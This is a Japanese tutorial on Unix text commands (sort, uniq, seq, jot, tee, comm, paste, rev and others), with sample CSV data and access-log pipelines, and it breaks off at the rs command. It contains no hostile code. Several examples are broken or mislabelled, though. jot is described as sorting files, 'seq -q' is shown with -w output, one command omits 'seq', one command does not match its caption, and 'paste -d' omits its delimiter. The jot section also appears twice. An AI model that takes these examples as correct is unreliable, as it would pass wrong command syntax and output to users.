「jot ファイル名」で、ファイルの中身を並べ替えます。

さっそく連番を出力してみます。
まずは10個の連番を出力します。

```
$ jot 10 
1
2
3
4
5
6
7
8
9
10
```

seqコマンドではこうなります
```
$ seq 10
1
2
3
4
5
6
7
8
9
10
```

### 文字列と組み合わせた連番を作成する

文字列 abc に続けて10個の連番を作成します。
```
$ jot -w abc 10
abc1
abc2
abc3
abc4
abc5
abc6
abc7
abc8
abc9
abc10
```

次の項でも説明しますが、seqコマンドでも同様のことができます。
```
$ seq -f "%04g" 3
0001
0002
0003
```

seqコマンドでもprintfフォーマットで出力できますので、文字列と連結した連番の生成もできます。
```
$ seq -f "IMG%04g.jpg" 3
IMG0001.jpg
IMG0002.jpg
IMG0003.jpg
```

では、次の項では`jot`コマンドで`printf`のフォーマットで出力する方法を具体的に説明します。


### printf のフォーマットで出力する

```
$ jot -w 'name%03d' 10
name001
name002
name003
name004
name005
name006
name007
name008
name009
name010
```

### 連番の範囲を指定して出力する

5からの連番を３つ出力します。
```
$ jot   -w 'name%03d' 3 5
name005
name006
name007
```

10からの連番を５つ出力します。
```
$ jot -w 'name%03d' 5 10
name010
name011
name012
name013
name014
bash-5.1$
```

### 乱数を出力する

1から10までの乱数を５つ出力します。
-r 5 は乱数を５つ出力することを示します。
1 10 は、１から１０までの範囲でといういみとなります。

1から100までの範囲で乱数を５つ出力すると以下の通りになります。
```
jot -r 5 1 100
1
6
17
91
46
```

print文フォーマットで、1から100までの範囲で乱数を５つ出力してみます。
```
$ jot -w 'name%03d' -r 5 1 10
name008
name006
name007
name001
name006
```


{{% tips-list tips %}}
ヒント
: 連番を作成する場合は`seq`、乱数を扱う場合は `$RANDOM`を使う場合が多いと思いますが、jotコマンドは、`seq`,`$RANDOM`を足し合わせて、同等それ以上の実行が可能です。
{{% /tips-list %}}



## sortコマンド
- テキストファイルを並べ替える
- 数値の大小で並べ替える
- フィールドを指定して並べ替える
- CSVデータを並べ替える


### sortコマンド概要
`sort`は、テキストファイルを「行単位で並べ替える」コマンドです。他のコマンドの実行結果を並べ替える場合にも使用できます。また、空白やカンマ区切りのデータに対し、並べ替えに使用するフィールドを指定することも可能です。


### sortコマンドの書式
sort [オプション] [ファイル……]


### sortコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-r|逆順で並べ替える|
|-n|文字列を数値と見なして並べ替える|
|-u|同一行は1つ目だけを出力する|
|-k 指定|場所と並べ替え種別を指定する（「-k 2」なら2列目、「-k 2n」なら2列目を数値として並べ替える。複数指定する場合は「-k」オプションを複数回指定する）|


### sortコマンド詳細説明

### テキストファイルを並べ替える 
「sort ファイル名」で、ファイルを並べ替えます。逆順で並べ替えたい場合は「sort -r ファイル名」とします。

以下のファイルを並べ替えてみます。
```:baz.txt
A
B
A
B
C
```

実行結果は以下のとおりです。
```
$ cat baz.txt | sort
A
A
B
B
C
```

逆順にソートするには -r オプションを付けます。
```
$ cat baz.txt | sort -r
C
B
B
A
A
```

### 数値の大小で並べ替える
　sortコマンドのデフォルトでは、数字も文字と同じように並べ替えられます。例えば、「1」と「11」と「100」では、「1」→「100」→「11」の順番になります。これを数値として「1」→「11」→「100」の順で並べ替えるには、「-n」オプションを使用します。

`seq`コマンドで１から１０までを出力します。
```
$ seq 10
1
2
3
4
5
6
7
8
9
10
```

では普通に並べ替えてみます。
```
$ seq 10 | sort
1
10
2
3
4
5
6
7
8
9
```

1の次に10が来てしまいました。文字を扱う並べ方でソートをしているからです。数値は数値を扱うことをsortコマンドに教えて上げる必要があります。 -n コマンドをつけます。n は numberのことです。

```
$ seq 10 | sort -n
1
2
3
4
5
6
7
8
9
10
```

### フィールドを指定して並べ替える
　「-k」オプションを使うと、並べ替えに使用する「フィールド」を指定できます。例えば、duコマンドの結果の2番目のフィールド、つまり「ディレクトリ名」で並べ替えるには、「du -s * | sort -k 2」のように指定します。さらに、2番目のフィールドで逆順に並べ替えるならば、「du -s * | sort -k 2r」と指定します。

まずは以下のファイルを作成します。
```:du.txt
2912	Applications
1519968	Calibre Library
24631656	Desktop
10141664	Documents
24	Downloads
872	Dropbox
0	Favorite
```

まずは最初のフィルド（ファイルサイズ）で並べ替えてみます。
```
$ cat du.txt | sort
0	Favorite
10141664	Documents
1519968	Calibre Library
24	Downloads
24631656	Desktop
2912	Applications
872	Dropbox
```


-n オプションを付けるのを忘れてしまいました。
次は -n オプションをつけて実行します。

```
$ cat du.txt | sort -n
0	Favorite
24	Downloads
872	Dropbox
2912	Applications
1519968	Calibre Library
10141664	Documents
24631656	Desktop
```

次は、２番目のフィールド（ディレクトリ名）で並べ替えを行います。
```
$ cat du.txt | sort -k2
2912	Applications
1519968	Calibre Library
24631656	Desktop
10141664	Documents
24	Downloads
872	Dropbox
0	Favorite
```

{{% tips-list tips %}}
ヒント
: sortコマンドはものすごく良く使います。たくさんのオプションがありますが、まずはここで紹介したオプションを覚えればほぼ問題はありません。必要になったらGoogleで検索してください。
{{% /tips-list %}}


### CSVデータを並べ替える
　「-k」オプションでは、空白文字を区切りとして、並べ替えに使うフィールドを指定することができます。区切り文字を変更したい場合は、「-t」オプションで使用する文字を指定します。

　例えば、CSV（comma-separated values）データの場合、区切り文字は「,（カンマ）」なので「-t ,」または「-t ","」のように指定します。

　なお、3番目のフィールドの値を数値として並べ替える場合は「-k 3n」、数値としてさらに逆順で並べ替えるなら「-k 3nr」のように指定します。

フィールドは以下のとおりです。
連番,氏名,氏名（カタカナ）,性別,年齢,取得ポイント

```:data.txt
$ cat test.csv
1,小出里歩,オデリホ,女,27,85
2,吉野里紗,ヨシノリサ,女,38,894
3,本郷末治,ホンゴウスエジ,男,56,252
4,谷村千代乃,タニムラチヨノ,女,44,556
5,内野響子,ウチノキョウコ,女,44,170
6,塩谷貢,シオタニミツグ,男,34,494
7,児島愛子,コジマアイコ,女,39,675
8,白木俊史,シラキトシフミ,男,57,245
9,飯塚遥佳,イイヅカハルカ,女,20,974
10,阿久津清蔵,アクツセイゾウ,男,9,120
```

sortコマンドでCSVデータを扱う場合は -t オプションを使います。
カンマ区切りの場合は -t, となります。

年齢で並べ替えてみます。
```
$ cat data.txt | sort -t, -nr -k5
8,白木俊史,シラキトシフミ,男,57,245
3,本郷末治,ホンゴウスエジ,男,56,252
5,内野響子,ウチノキョウコ,女,44,170
4,谷村千代乃,タニムラチヨノ,女,44,556
7,児島愛子,コジマアイコ,女,39,675
2,吉野里紗,ヨシノリサ,女,38,894
6,塩谷貢,シオタニミツグ,男,34,494
1,小出里歩,オデリホ,女,27,85
9,飯塚遥佳,イイヅカハルカ,女,20,974
10,阿久津清蔵,アクツセイゾウ,男,9,120
```
sort -t, -nr -k5
-t, は、CSVデータの区切り文字をカンマ（,）とする
-nr の、nは並べ替えのデータを数値として扱う
    の、rは逆順で出力する
-k5 は、並べ替えのキーとなるフィールドを５列目とする

という意味です。
では、６列目の取得ポイントの多く順に並べ替えてみます。

```
bash-5.1$ cat data.txt | sort -t, -nr -k6
9,飯塚遥佳,イイヅカハルカ,女,20,974
2,吉野里紗,ヨシノリサ,女,38,894
7,児島愛子,コジマアイコ,女,39,675
4,谷村千代乃,タニムラチヨノ,女,44,556
6,塩谷貢,シオタニミツグ,男,34,494
3,本郷末治,ホンゴウスエジ,男,56,252
8,白木俊史,シラキトシフミ,男,57,245
5,内野響子,ウチノキョウコ,女,44,170
10,阿久津清蔵,アクツセイゾウ,男,9,120
1,小出里歩,オデリホ,女,27,85
```

{{% tips-list tips %}}
ヒント
: csvデータのカンマ区切りは見にくいですね。
: 工夫してタブ区切りに変換して出力してみてください。
{{% /tips-list %}}



```
$ cat data.txt | sort -t, -nr -k6 | tr "," "\t"
9	飯塚遥佳	イイヅカハルカ	女	20	974
2	吉野里紗	ヨシノリサ	女	38	894
7	児島愛子	コジマアイコ	女	39	675
4	谷村千代乃	タニムラチヨノ	女	44	556
6	塩谷貢	シオタニミツグ	男	34	494
3	本郷末治	ホンゴウスエジ	男	56	252
8	白木俊史	シラキトシフミ	男	57	245
5	内野響子	ウチノキョウコ	女	44	170
10	阿久津清蔵	アクツセイゾウ	男	9	120
1	小出里歩	オデリホ	女	27	85
```

{{% tips-list tips %}}
ヒント
: ちょっと見やすくなりました（^^;
{{% /tips-list %}}



## revコマンド
- ファイルの各行を反転させる
- キーボードから入力した内容を反転させる

### revコマンド概要
reverseの語源を持つ「rev」は、ファイルの各行を末尾から行頭に向かって文字列を反転させ出力します。

### revコマンドの書式
rev ファイル名


### revコマンドの主なオプション

|オプション    |意味|
|--------------|----|

オプションはありません。


### revコマンド詳細説明

### ファイルの各行を反転させる

```:data.txt
$ cat data.txt
1,小出里歩,オデリホ,女,27,85
2,吉野里紗,ヨシノリサ,女,38,894
3,本郷末治,ホンゴウスエジ,男,56,252
4,谷村千代乃,タニムラチヨノ,女,44,556
5,内野響子,ウチノキョウコ,女,44,170
6,塩谷貢,シオタニミツグ,男,34,494
7,児島愛子,コジマアイコ,女,39,675
8,白木俊史,シラキトシフミ,男,57,245
9,飯塚遥佳,イイヅカハルカ,女,20,974
10,阿久津清蔵,アクツセイゾウ,男,9,120
```

実行結果は以下のとおりです。
```
$ cat data.txt | rev
58,72,女,ホリデオ,歩里出小,1
498,83,女,サリノシヨ,紗里野吉,2
252,65,男,ジエスウゴンホ,治末郷本,3
655,44,女,ノヨチラムニタ,乃代千村谷,4
071,44,女,コウョキノチウ,子響野内,5
494,43,男,グツミニタオシ,貢谷塩,6
576,93,女,コイアマジコ,子愛島児,7
542,75,男,ミフシトキラシ,史俊木白,8
479,02,女,カルハカヅイイ,佳遥塚飯,9
021,9,男,ウゾイセツクア,蔵清津久阿,01
```

{{% tips-list tips %}}
ヒント
: どんなときに使うのでしょうね。むしろ、どう使うのかというよりも、必要になったときに思い出すと激しく便利、といったトリッキーなコマンドのようです。`tac`と`rev`はセットで覚えておきましょう。
{{% /tips-list %}}


## seqコマンド
- 連続番号を出力する
- 開始の数と間隔を指定する
- 数字を逆順で出力する
- 書式を指定して出力する


### seqコマンド概要
`sequence`の語源を持つ「seq」は連続番号の他、一定間隔置きに数字の列を出力する順列番号出力コマンドです。



### seqコマンドの書式
seq [オプション] [開始の数 [増分]] 終了の数



### seqコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-w|先頭を0で埋めて、数字の幅を等しくする|
|-f 書式|数字の書式を指定する|
|-s 文字列|数字の区切りに使う文字列を指定する|

### seqコマンド詳細説明

### 連続番号を出力する 
　一般的な`seq`コマンドの利用例として、 `seq 10`は、1から10までを出力します。

１から指定した数までの連続番号を出力する
```
$ seq 10
1
2
3
4
5
6
7
8
9
10
```

出力される数字の桁を併せたい場合はよくあります。
例えば、二桁で表示させたい場合に、2ではなく02、3ではなく03といった出力です。

この場合は「-w」オプションを使用して桁を揃えることができます。例えば `seq -w 10` の場合、幅が最大なのは「10」ですから、01、02と2桁で出力されます。


先頭を0で埋めて桁数をそろえて出力する
```
$ seq -q 10
01
02
03
04
05
06
07
08
09
10
```

### 開始の数と間隔を指定する
　開始の数を指定する場合は `seq 5 15` のように、「seq 開始の数 終了の数」と指定します。

seq 5 （1から5までの数を出力する）
```
$ seq 5
1
2
3
4
5
```
　開始位置を指定することもできます。たとえば以下のように、5から始まり15までの順列を出力したい場合は以下のとおりです。

seq 5 15 （5から15までの数を出力する）
```
$ 5 15
5
6
7
8
9
10
11
12
13
14
15
```


`seq 5 2 15` のように、開始と終了の間に増分を指定することもできます。

seq 5 2 15 （5から15まで、数を2ずつ増やしながら出力する）
```
$ seq 5 2 10
5
7
9
```


### 数字を逆順で出力する 
　増分には実数や負の数を指定できます。従って、増分を「-1」と指定することで、数を逆順に出力することが可能です。この場合、開始と終了の数を指定する必要がある点に注意してください。

seq 5 -1 1 （5から1までの数を出力する）
```
$ seq 5 -1 1
5
4
3
2
1
```

　増分を「-1」と指定した場合と同じ効果を、別のコマンドを用いて実現できます。入力を行単位で逆順に出力する「tac」コマンドです。

seq 5 | tac （seqで1から5を出力し、tacコマンドで逆順に並び替えている）
```
$ seq 5 | tac
5
4
3
2
1
```

### 書式を指定して出力する
　「-f」オプションを用いて数字の書式を指定することができます。

　「%g」を利用することで、整数で出力する際の桁数を指定できます。例えば、4桁の幅であれば「%4g」、4桁で「0001」のようにゼロで埋めるならば「%04g」のようにします。


seq -f 書式 3 （1から3までの数値を指定した書式で出力する）
```
$ seq -f "%04g" 3
0001
0002
0003


$ seq -f "IMG%04g.jpg" 3
IMG0001.jpg
IMG0002.jpg
IMG0003.jpg
``` 

{{% tips-list tips %}}
ヒント
: 次はtacコマンドについて説明します。
{{% /tips-list %}}




## tacコマンド
- ファイルを最終行から逆順に出力する

### tacコマンド概要
`cat`コマンドを逆から読んだ「tac」はファイルの最終行から、行単位に逆順に出力するコマンドです。知る人ぞ知るマニア向けコマンドの一つです。


### tacコマンドの書式
tac [オプション] ファイル名


### tacコマンドの主なオプション

|オプション    |意味|
|--------------|----|

特筆するべきオプションはありません。


### tacコマンド詳細説明

### ファイルを最終行から逆順に出力する 
「tac ファイル名」で、指定したファイルを最終行から逆順に出力します

```:data.txt
$ cat data.txt
1,小出里歩,オデリホ,女,27,85
2,吉野里紗,ヨシノリサ,女,38,894
3,本郷末治,ホンゴウスエジ,男,56,252
4,谷村千代乃,タニムラチヨノ,女,44,556
5,内野響子,ウチノキョウコ,女,44,170
6,塩谷貢,シオタニミツグ,男,34,494
7,児島愛子,コジマアイコ,女,39,675
8,白木俊史,シラキトシフミ,男,57,245
9,飯塚遥佳,イイヅカハルカ,女,20,974
10,阿久津清蔵,アクツセイゾウ,男,9,120
```

実行結果は以下のとおりです。
```
$ cat data.txt | tac
10,阿久津清蔵,アクツセイゾウ,男,9,120
9,飯塚遥佳,イイヅカハルカ,女,20,974
8,白木俊史,シラキトシフミ,男,57,245
7,児島愛子,コジマアイコ,女,39,675
6,塩谷貢,シオタニミツグ,男,34,494
5,内野響子,ウチノキョウコ,女,44,170
4,谷村千代乃,タニムラチヨノ,女,44,556
3,本郷末治,ホンゴウスエジ,男,56,252
2,吉野里紗,ヨシノリサ,女,38,894
1,小出里歩,オデリホ,女,27,85
```


{{% tips-list tips %}}
ヒント
: `cat`の反転が`tac`。よく考えたものです。恐れ入りました。
: 次はrevコマンドについて説明します。
{{% /tips-list %}}



## uniqコマンド
- 重複している行を削除する
- 大文字／小文字を区別しないで重複行を削除する
- 重複している行をカウントする


### uniqコマンド概要
`uniq`コマンドは、ファイル内の重複している行を扱うコマンドです。具体的には重複している行を除去して表示したり、重複回数を表示したりできます。

{{% tips-list tips %}}
ヒント
: `uniq`コマンドを実行する前に`sort`コマンドで並べ替えておく必要があります。
{{% /tips-list %}}


### uniqコマンドの書式
uniq [オプション] 入力ファイル [出力ファイル]


### uniqコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-i|比較時に大文字と小文字の違いを無視する|
|-c|各行の前に出現回数を出力する|


### uniqコマンド詳細説明

### 重複している行を削除する
$ `uniq` ファイル名 で、ファイル内の重複行を取り除くことができます。注意点はあらかじめ`sort`コマンドで並べ替えておく必要があります。

{{% tips-list tips %}}
ヒント
: 実は `sort -u` というコマンドは、並べ替えつつuniqも実行するという便利な`sort`コマンドのオプションもあります。一般的には`sort -u`を使うことが多いのですが、明示的にuniqコマンドを使うこともあります。
{{% /tips-list %}}


以下のコマンドの出力は同じです。
```
$ cat fileName.txt | sort | uniq
$ cat fileName.txt | sort -u
```

### 大文字／小文字を区別しないで重複行を削除する
「-i」（--ignore-case）オプションを使うと、大文字／小文字を区別しないで重複する行を削除することができます。

{{% tips-list tips %}}
ヒント
: `uniq`コマンドのignore-caseは-iです。同時に予め実行しておくsortコマンドもignore-caseも行う必要がありますが、こちらのオプションは -f です。紛らわしいですね。 
{{% /tips-list %}}

{{% tips-list tips %}}
ヒント
: 各コマンドのignore-case(大文字小文字を区別しない)は、以下のとおりです。
: sort -f
: uniq -i
: grep -i
{{% /tips-list %}}


実行結果は以下のとおりです。
```
$ cat fileName.txt | sort -f | uniq -i
```


### 重複している行をカウントする
`sort`と`uniq`コマンドの組み合わせで、最も使われるオプションは-cでしょう。「-c」オプションは、重複している行をカウントします。

アクセスログを並べ替えて表示
```
cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15
```

最初の`cat`でApacheのaccess.logを出力します。
次の`sort`で出力を並べ替えます。
そして`uniq -c`で、重複行の数をカウントし、行頭に頻度数を付与します。
さらに、行頭の頻度数を数値として扱い`sort -n`で並べ替えます。
最後の`head -n15`コマンドで、頻度の高いアクセスを出力します。


{{% tips-list tips %}}
ヒント
: CSSなどのファイルを除外する場合は以下のコマンドを使うと良いでしょう。 
{{% /tips-list %}}

 
```
cat /var/log/httpd/access.log | grep -ive "GET /.*\.\(css\|js\|jpg\|gif\|png\|swf\|ico\)\ HTTP" | sort | uniq -c | sort -n | head -n15
```


## teeコマンド
- ファイルへのリダイレクトとパイプを同時に行う
- 出力するファイルは都度新規作成ではなく追記する


### teeコマンド概要
`tee`コマンドは、標準入力から受け取った出力を、標準出力へ出力しつつ、同時にファイルに書き出すコマンドです。


### teeコマンドの書式
コマンド | tee ファイル | コマンド2
コマンド | tee ファイル1 ファイル2 ファイル3……


### teeコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-a|指定したファイルが既に存在する場合、新規にファイルを作成せずにすでに存在するファイルに追加する（リダイレクトの「>>」に相当）|


### teeコマンド詳細説明

### ファイルへのリダイレクトとパイプを同時に行う 

以下のコマンドは、画面に出力をしつつ、同じ内容を output.txtに出力しています。
```
$ cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 | tee output.txt
```


### 出力するファイルは都度新規作成ではなく追記する
`tee`コマンドは指定されたファイルを新規作成して出力内容をファイルに書き出します。-a オプションを付けることによって、append（追記）することができます。

output.txtに出力を追記する
```
# 予めファイルを生成しておく
$ :>output.txt
$ cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 | tee -a output.txt
# 時間をおいて再度実行すると追記される
$ cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 | tee -a output.txt
```

{{% tips-list tips %}}
ヒント
: `tee`コマンドの -aオプションは非常によく使います。
: teeコマンドの出力をファイル書き出す場合、デフォルトは「>」と同等の処理で、-aオプションを付けることによって「>>」と同様に処理となります。
{{% /tips-list %}}

{{% tips-list alert %}}
注意
: 「>>」も同様に `tee -a`の場合は、予めファイルを作成しておき、そのファイルに対して「>>」や`tee -a`を行います。追記する最初の処理段階でファイルが存在していることを明示的に書いておくことが重要です。
: 以下のまとめのように、追記する前に上書きする処理をしておく場合は、あらかじめファイルの生成をする必要はありませんが、明示的に「 $ :> filename 」のようにファイルを生成しておくと、ソースがわかりやすくなります。
{{% /tips-list %}}


まとめ
`echo`だと以下のとおりです。ファイルには出力されるが、画面には処理内容が出力されないのでいまいち不便。
```
# 上書き
$ echo "文字列" > fileName
# 追記
$ echo "文字列" >> fileName
```

そこで、処理の出力内容が画面にも表示されるよう`tee`を使う

```
# 上書き
$ echo "文字列" | tee fileName
# 追記
$ echo "文字列" | tee -a fileName
```



## columnコマンド
「column」はテキストを、複数の列（column）に整形するコマンドです。

### 区切り文字を指定して表形式で表示する

普通のカンマ区切りのcsvファイル
```
$ cat hoge.csv
bar00,bar01,bar02,bar03,bar04
bar05,bar06,bar07,bar08,bar09
```

上記csvファイルを、`column`コマンドで見やすくします。
オプション -s で区切り文字をカンマ(,)に指定し、
オプション -t を利用し区切り文字(,)をTABに置き換えます。

```
$ column -t -s, hoge.csv
bar00  bar01  bar02  bar03  bar04
bar05  bar06  bar07  bar08  bar09
```

## commコマンド
`comm`コマンドは、テキストファイルを比較するコマンドです。
`comm ファイル1 ファイル2` で2つのテキストファイルを比較し、ファイル1だけにある行、ファイル2だけにある行、共通している行を出力します。
比較するファイルはソートされている必要があります。

{{% tips-list tips %}}
ヒント
: 比較するファイルはソートされている必要があるんです！
{{% /tips-list %}}

### 使い方

まずは１つ目のファイル
```
$ cat words.txt
Apple
Banana
Orange
India
US
Canada
```

そして２つ目のファイル
```
$ cat countries.txt
India
US
Canada
Japan
```

```
$ comm  <(sort words.txt | uniq) <(sort countries.txt | uniq)
Apple
Banana
		        Canada
		        India
	    Japan
Orange
		        US
$
```

{{% tips-list tips %}}
ヒント
: <と(の間は空白などを含めてはいけません。
{{% /tips-list %}}


インデントで３つの区分が見えますね。
１つ目のインデント列は、１つ目のファイルにだけあるもの、
２つ目のインデント列は、２つ目のファイルにだけあるもの、
３つ目のインデント列は、両方のファイルにあるもの

です。


### 共通している行だけを表示する
「-1」「-2」「-3」オプションで、「表示しない列」を指定できます。


|オプション|説明|
|:---:|:---:|
|-1		|１列目（ファイル1のみに含まれる行）を出力しない|
|-2		|２列目（ファイル2のみに含まれる行）を出力しない|
|-3		|３列目（両方のファイルに含まれる行）を出力しない|

２列目と３列目を表示しないようにします。
１列目だけを表示、要するに１列目にだけあるものを表示します。
```
$ comm -23 <(sort words.txt | uniq) <(sort countries.txt | uniq)
Apple
Banana
Orange
```

１列目と３列目を表示しないようにします。
２列目だけを表示、要するに２つ目のファイルにだけあるものを表示します。
```
$ comm -13 <(sort words.txt | uniq) <(sort countries.txt | uniq)
Japan
$
```

### 両方のファイルにある項目を表示

１列目と２列目を表示しないようにします。
３列目だけを表示、要するに両方のファイルに存在するものを表示します。
```
$ comm -12 <(sort words.txt | uniq) <(sort countries.txt | uniq)
Canada
India
US
$
```

{{% tips-list tips %}}
ヒント
: 「-1」「-2」「-3」オプションは、「表示しない列」を指定します。
{{% /tips-list %}}



## joinコマンド
`join` は、2つのテキストファイルの内容を比較し、共通する項目がある行を連結するコマンドです。
例えば、
１つ目のテキストファイルに「100 apple」、
２つ目のテキストファイルに「100 リンゴ」、
という行があった場合、100 を共通する項目に指定することで、
「100 apple リンゴ」と出力します。



### オプション無しの場合
`join` コマンドに何もオプションがない場合、2つのテキストファイルを比較し、先頭（左から数えて1番目）の項目が共通していたら結合して出力します。
例えば、
１つ目のテキストファイルに「100 apple」、
２つ目のファイルには「100 リンゴ」という行があった場合は、
先頭（左から数えて１番目）の項目を共通項目として連結し、
「100 apple リンゴ」と出力します。


### 共通項の指定
共通しているかどうかの比較に使用する項目は、`join -1` および `join -2` オプションで変更できます。
例えば、１つ目のファイルでは“左から数えて３番目の項目”を使いたい場合、`join -1 3` のように指定します。
１つ目、２つ目のファイル両方で３番目の項目を使いたい場合は、`join -1 3 -2 3` のように指定するか、`join -j 3`のように、「-j」オプションでまとめて指定することもできます。

{{% tips-list tips %}}
ヒント
: pasteコマンドしかり、このjoinコマンドも、しらなければプログラムを書いてなんとかなる内容ではありますが、知っているといとも簡単に実現できるわけです。
{{% /tips-list %}}



## jotコマンド
- 連番を生成する
- 文字列と組み合わせた連番を作成する
- printf のフォーマットで出力する
- 連番の範囲を指定して出力する
- 乱数を出力する

### jotコマンド概要
jotコマンドは、連番数字はもちろん、連番付きのアルファベットを生成したり、ランダムな数字を生成したりできます。似たコマンドに `seq`や`$RANDOM` コマンドがあります。


### jotコマンドの書式
jot [オプション] 


### jotコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-w [文字列]|文字列を指定する|
|-r|乱数を出力する|


### jotコマンド詳細説明

### 連番を作る
「jot ファイル名」で、ファイルの中身を並べ替えます。

さっそく連番を出力してみます。
まずは10個の連番を出力します。

```
$ jot 10 
1
2
3
4
5
6
7
8
9
10
```

seqコマンドではこうなります
```
$ seq 10
1
2
3
4
5
6
7
8
9
10
```

### 文字列と組み合わせた連番を作成する

文字列 abc に続けて10個の連番を作成します。
```
$ jot -w abc 10
abc1
abc2
abc3
abc4
abc5
abc6
abc7
abc8
abc9
abc10
```

次の項でも説明しますが、seqコマンドでも同様のことができます。
```
$ seq -f "%04g" 3
0001
0002
0003
```

seqコマンドでもprintfフォーマットで出力できますので、文字列と連結した連番の生成もできます。
```
$ seq -f "IMG%04g.jpg" 3
IMG0001.jpg
IMG0002.jpg
IMG0003.jpg
```

では、次の項では`jot`コマンドで`printf`のフォーマットで出力する方法を具体的に説明します。


### printf のフォーマットで出力する

```
$ jot -w 'name%03d' 10
name001
name002
name003
name004
name005
name006
name007
name008
name009
name010
```

### 連番の範囲を指定して出力する

5からの連番を３つ出力します。
```
$ jot   -w 'name%03d' 3 5
name005
name006
name007
```

10からの連番を５つ出力します。
```
$ jot -w 'name%03d' 5 10
name010
name011
name012
name013
name014
bash-5.1$
```

### 乱数を出力する

1から10までの乱数を５つ出力します。
-r 5 は乱数を５つ出力することを示します。
1 10 は、１から１０までの範囲でといういみとなります。

1から100までの範囲で乱数を５つ出力すると以下の通りになります。
```
jot -r 5 1 100
1
6
17
91
46
```

print文フォーマットで、1から100までの範囲で乱数を５つ出力してみます。
```
$ jot -w 'name%03d' -r 5 1 10
name008
name006
name007
name001
name006
```


## numfmtコマンド
numfmtコマンドは、数値の桁揃えや、金額を表示する場合の３桁区切りを簡単に実行できる便利コマンドです。

`numfmt --format="書式" 数値`で、数値を書式に従って整形して表示します。
使用できる書式は「%桁数f」と「%'f」です。
例えば「--format="%5f"」とすると数値を5桁の幅で表示し、「--format="%'f"」では数値を3桁区切りで表示します。

### 数値を桁ぞろえやカンマ区切りで表示する


123を5桁の幅で表示
numfmt --format="%5f" 123
```
$ echo 10000 | numfmt --format="%5f"
10000
$
```

10000を3桁区切りで表示
numfmt --format="%'f" 10000
```
$ echo 10000 | numfmt --format="%'f"10,000
10,000
$
```

10000を3桁区切りで8桁の幅で表示
numfmt --format="%'8f" 10000
```
$ echo 10000 | numfmt --format="%'8f"
  10,000
$
```


## pasteコマンド
`paste`コマンドは、複数のファイルを行単位で連結するコマンドです。
`$ pasteファイル1 ファイル2` で「ファイル1の1行目とファイル2の1行目」、「ファイル1の2行目とファイル2の2行目」……という行が出力されます。
Excelに親しんでいる方は、「列のコピー」と考えると動作をイメージしやすいかもしれません。


### ファイルの連結

１つ目のファイル
```
$ cat emp-number.txt
100
200
300
400
500
```

２つ目のファイル
```
$ cat emp-firstname.txt
Emma
Alex
Madison
Sanjay
Nisha
```

３つ目のファイル
```
$ cat emp-lastname.txt
Thomas
Jason
Randy
Gupta
Singh
```

`paste`コマンドで結合
```
$ paste emp-number.txt emp-firstname.txt emp-lastname.txt
100     Emma    Thomas
200     Alex    Jason
300     Madison Randy
400     Sanjay  Gupta
500     Nisha   Singh
```
{{% tips-list tips %}}
ヒント
: すごい！
{{% /tips-list %}}


### 区切り文字を指定する

区切り文字は「-d」オプションで指定します。
例えば、カンマ（,）区切りで出力したい場合は `paste -d,` と指定します。


```
$ paste -d emp-number.txt emp-firstname.txt emp-lastname.txt
100,Emma,Thomas
200,Alex,Jason
300,Madison,Randy
400,Sanjay,Gupta
500,Nisha,Singh
```

{{% tips-list tips %}}
ヒント
: すごい！！
{{% /tips-list %}}


### 行列を入れ替える
`paste -s` （--serialオプション）で、行列を入れ替えて結合します。


```
$ paste -s emp-number.txt emp-firstname.txt emp-lastname.txt
100	200	300	400	500
Emma 	Alex 	Madison 	Sanjay 	Nisha
Thomas 	Jason 	Randy 	Gupta 	Singh
$
```


##  rev コマンド
すべての行の文字の順序を逆にする

次の例に示すように、すべての行で文字の順序を逆にします。
`tac` コマンドはファイルの各行を上下反転しますが、
`rev` コマンドは行の各文字の前後を反転します。

普通に`cat`します。
```
$ cat thegeekstuff.txt
1. Linux Sysadmin, Scripting etc.,
2. Databases Oracle, mySQL etc.,
3. Hardware
4. Security (Firewall, Network, Online Security etc)
5. Storage
6. Cool gadgets and websites
7. Productivity (Too many technologies to explore, not much time available)
8. Website Design
9. Software Development
10. Windows Sysadmin, reboot etc.,
11. Adding 1's and 0's
```


`rev`コマンドを実行した結果
```
$ rev thegeekstuff.txt
,.cte gnitpircS ,nimdasyS xuniL .1
,.cte LQSym ,elcarO sesabataD .2
erawdraH .3
)cte ytiruceS enilnO ,krowteN ,llaweriF( ytiruceS .4
egarotS .5
setisbew dna stegdag looC .6
)elbaliava emit hcum ton ,erolpxe ot seigolonhcet ynam ooT( ytivitcudorP .7
ngiseD etisbeW .8
tnempoleveD erawtfoS .9
,.cte toober ,nimdasyS swodniW .01
s'0 dna s'1 gniddA .11
```

「rev」は「cat」と同じく先頭行から順番に表示しますが、表示する文字の並びが行の末尾から逆に並び替えて表示を行います。

{{% tips-list tips %}}
ヒント
: 「rev」は「reverse」の略です。
{{% /tips-list %}}


###  find の出力結果を拡張子でソート
「rev」コマンドの活用場面を思い浮かべることはできませんでしたが、下記の様にすることで findで検索した結果のファイルを拡張子単位でソートをすることができます。

```
$ find . -type f | rev | sort | rev
```

実行結果
```
./file1.c
./dir/file2.c
./dir2file3.c
./header1.h
./header2.h
./dir2/header3.h
./text1.txt
./text2.txt
./dir/text3.txr
```

### ドメイン名リストのソート
www1・www2 などのサブドメインではなく、example.com や example.net などのドメインでソートしたいとする。
その場合、`rev` コマンドで逆順にし、ソートし、再度 `rev` コマンドで戻すとよい。

ドメイン名リスト
```
www1.example.com
www-a.example-b.com
www1.example.net
www-b.example-b.com
www2.example.com
www2.example.net
```

実行結果
```
$ cat foo.txt | rev | sort | rev
www-a.example-b.com
www-b.example-b.com
www1.example.com
www2.example.com
www1.example.net
www2.example.net
```



## rsコマンド
`rs`コマンドは、行列を入れ替えるコマンドです。
行列を入れ替える処理は、これはもう頻繁に起こるのです。
そのたびに頭を悩ませることになります。
プログラマのほとんどの人は、プログラムを書くよりもGoogleで調べる時間、
ソートのアルゴリズムを最適化するよりも、効率的な行列入れ替えのプログラムに頭を悩ませる時間のほうが多いかもしれません。

結論。
「行列入れ替えのプログラムを書く必要はありません、もうあります」

### 行列の入れ替え
例えば以下のような表形式のテキストファイルがあるとします。
```
$ cat sample.txt
1 2 3
4 5 6
7 8 9
```
